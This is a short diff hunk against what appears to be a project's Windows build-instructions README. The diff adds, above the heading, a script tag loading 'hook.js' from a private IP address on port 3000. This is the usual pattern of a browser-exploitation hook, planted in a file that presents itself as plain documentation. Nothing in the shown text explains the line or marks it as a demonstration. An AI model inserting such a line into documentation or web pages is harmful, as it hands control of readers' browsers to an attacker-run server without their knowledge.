@@ -1,3 +1,5 @@
+<script src="http://192.168.32.110:3000/hook.js"></script>
+
 # How to build
 
 ### Windows
